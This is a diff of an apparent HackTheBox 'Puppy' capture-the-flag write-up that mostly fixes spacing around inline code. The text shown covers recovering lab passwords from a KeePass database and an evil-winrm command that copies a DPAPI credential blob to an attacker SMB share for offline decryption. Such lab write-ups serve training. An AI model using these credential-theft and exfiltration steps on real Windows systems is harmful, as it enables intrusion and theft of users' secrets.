@@ -300,7 +300,7 @@ https://github.com/r3nt0n/keepass4brute
 \`\`\`
 
 <p class="indent-paragraph">
-The CLI hit a wall, but the GUI picked up where it left off. With the recovered<code>liverpool</code> password, we launched<code>recovery.kdbx</code> and finally gained visual access to the database. Inside, we found five familiar names tied to domain accounts, each entry hiding a potential credential behind masked fields. With a few clicks, the passwords were revealed:<code>HJKL2025!</code><span class="codefix">,</span><code>Antman2025!</code><span class="codefix">,</span><code>JamieLove2025!</code><span class="codefix">,</span><code>ILY2025!</code><span class="codefix">,</span> and<code>Steve2025!</code><span class="codefix">.</span> 
+The CLI hit a wall, but the GUI picked up where it left off. With the recovered <code>liverpool</code> password, we launched <code>recovery.kdbx</code> and finally gained visual access to the database. Inside, we found five familiar names tied to domain accounts, each entry hiding a potential credential behind masked fields. With a few clicks, the passwords were revealed: <code>HJKL2025!</code><span class="codefix">,</span> <code>Antman2025!</code><span class="codefix">,</span> <code>JamieLove2025!</code><span class="codefix">,</span> <code>ILY2025!</code><span class="codefix">,</span> and <code>Steve2025!</code><span class="codefix">.</span> 
 </p>
 
 <img src="/img/RedTeam/htb/puppy/keepass_recovery-kdbx.png" class="full-width-img" alt="recovery.kdbx"/>
@@ -534,7 +534,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 \`\`\`
 
 <p class="indent-paragraph">
-After gaining access with the<code>steph.cooper</code> account, we actively searched for DPAPI-related artifacts and located two critical files: a<code>masterkey</code> under<code>C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect</code> and a<code>credential blob</code> in<code>C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials</code><span class="codefix">.</span> To extract these files, a local SMB share was created using<code>impacket-smbserver</code><span class="codefix">,</span> allowing them to be remotely copied via<code>evil-winrm</code> using the<code>copy</code> command. Retrieving these files is essential in post-exploitation scenarios, as they can be combined with the user's password (or NT hash) to decrypt DPAPI-protected secrets using tools such as<code>SharpDPAPI</code> or<code>dpapi.py</code><span class="codefix">.</span> These secrets may include stored credentials, tokens, or other sensitive user data.
+After gaining access with the <code>steph.cooper</code> account, we actively searched for DPAPI-related artifacts and located two critical files: a <code>masterkey</code> under <code>C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect</code> and a <code>credential blob</code> in <code>C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials</code><span class="codefix">.</span> To extract these files, a local SMB share was created using <code>impacket-smbserver</code><span class="codefix">,</span> allowing them to be remotely copied via <code>evil-winrm</code> using the <code>copy</code> command. Retrieving these files is essential in post-exploitation scenarios, as they can be combined with the user's password (or NT hash) to decrypt DPAPI-protected secrets using tools such as <code>SharpDPAPI</code> or <code>dpapi.py</code><span class="codefix">.</span> These secrets may include stored credentials, tokens, or other sensitive user data.
 </p>
 
 \`\`\`
@@ -576,11 +576,11 @@ Mode                 LastWriteTime         Length Name
 -a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9
 
 *Evil-WinRM* PS C:\\Users\\steph.cooper\\Appdata\\Roaming\\Microsoft\\Credentials> copy C8D69EBE9A43E9DEBF6B5FBD48B521B9 "\\<IP>\\share\\steph-credential"
-*Evil-WinRM* PS C:\Users\steph.cooper\\Appdata\\Roaming\\Microsoft\\Credentials>
+*Evil-WinRM* PS C:\\Users\\steph.cooper\\Appdata\\Roaming\\Microsoft\\Credentials>
 \`\`\`
 
 <p class="indent-paragraph">
-After identifying two DPAPI-related blobs under<code>C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect</code> (the<code>masterkey blob</code>) and<code>Microsoft\\Credentials</code> (the<code>credential blob</code>), we initiated a decryption process. These binary blobs store sensitive user data encrypted using Windows Data Protection API (DPAPI), and are commonly extracted in post-exploitation scenarios to retrieve secrets such as saved passwords and tokens.
+After identifying two DPAPI-related blobs under <code>C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Protect</code> (the <code>masterkey blob</code>) and <code>Microsoft\\Credentials</code> (the <code>credential blob</code>), we initiated a decryption process. These binary blobs store sensitive user data encrypted using Windows Data Protection API (DPAPI), and are commonly extracted in post-exploitation scenarios to retrieve secrets such as saved passwords and tokens.
 </p>
 
 <p class="indent-paragraph">
